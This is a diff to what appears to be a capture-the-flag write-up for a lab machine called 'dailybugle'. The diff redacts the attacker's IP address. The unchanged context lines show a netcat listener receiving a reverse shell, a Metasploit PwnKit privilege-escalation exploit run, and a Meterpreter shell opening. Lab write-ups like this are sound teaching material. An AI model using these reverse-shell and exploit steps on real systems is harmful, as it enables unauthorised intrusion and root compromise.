@@ -84,7 +84,7 @@ Hack into the machine and obtain the root user's credentials.
 ┌──(0xskar㉿cocokali)-[~/thm/rooms/dailybugle]
 └─$ nc -nvlp 7777          
 listening on [any] 7777 ...
-connect to [10.2.127.225] from (UNKNOWN) [10.10.16.193] 41306
+connect to [10.x.x.x] from (UNKNOWN) [10.10.16.193] 41306
 Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
  18:10:50 up  1:06,  0 users,  load average: 0.00, 0.01, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -119,7 +119,7 @@ Meterpreter  : x86/linux
 ```shell
 msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit
 
-[*] Started reverse TCP handler on 10.2.127.225:4444 
+[*] Started reverse TCP handler on 10.x.x.x:4444 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [!] Verify cleanup of /tmp/.ssbbnl
 [+] The target is vulnerable.
@@ -129,7 +129,7 @@ msf6 exploit(linux/local/cve_2021_4034_pwnkit_lpe_pkexec) > exploit
 [+] Deleted /tmp/.ozchxfocjj/corwmy/corwmy.so
 [+] Deleted /tmp/.ozchxfocjj/.ztjfms
 [+] Deleted /tmp/.ozchxfocjj
-[*] Meterpreter session 2 opened (10.2.127.225:4444 -> 10.10.16.193:48942) at 2022-06-23 16:04:50 -0700
+[*] Meterpreter session 2 opened (10.x.x.x:4444 -> 10.10.16.193:48942) at 2022-06-23 16:04:50 -0700
 
 meterpreter > shell
 Process 22448 created.
